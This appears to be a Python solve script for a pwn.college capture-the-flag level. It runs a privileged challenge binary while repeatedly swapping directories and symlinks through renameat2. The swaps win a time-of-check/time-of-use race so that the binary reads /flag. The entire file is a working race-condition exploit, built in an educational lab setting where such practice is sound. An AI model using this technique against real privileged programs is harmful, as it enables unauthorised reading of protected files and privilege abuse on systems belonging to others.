# Level5 1
import pwn
import os
import tempfile
import ctypes
from dojotool import find_challenge


def ctf() -> None:
    root_bin = find_challenge()

    # def swap(a, b):
    #     c = a + "_tmp"
    #     os.rename(a, c)
    #     os.rename(b, a)
    #     os.rename(c, b)

    libc = ctypes.CDLL(None)

    def swap(a, b):
        libc.renameat2(-100, a.encode(), -100, b.encode(), 2)

    i = 0
    while True:
        print(i)
        i += 1
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                d1 = tmpdir + "/etc1"
                d2 = tmpdir + "/etc2"
                d3 = tmpdir + "/etc3"

                os.mkdir(d1)
                open(d1 + "/hosts", "w").close()

                os.symlink("/etc", d2)

                os.mkdir(d3)
                os.symlink("/flag", d3 + "/hosts")
                
                with pwn.process([root_bin, d1 + "/hosts"], raw=True, level="error") as io:
                    # io.recvuntil(b"Paused")
                    # io.sendline()

                    # io.recvuntil(b"Paused")
                    swap(d2, d1)
                    # io.sendline()

                    # io.recvuntil(b"Paused")
                    swap(d3, d1)
                    # io.sendline()
                    data = io.recvrepeat().decode(errors="ignore")
                    if "pwn.college{" in data:
                        print(data)
                        break
        except Exception:
            pass


if __name__ == "__main__":
    ctf()
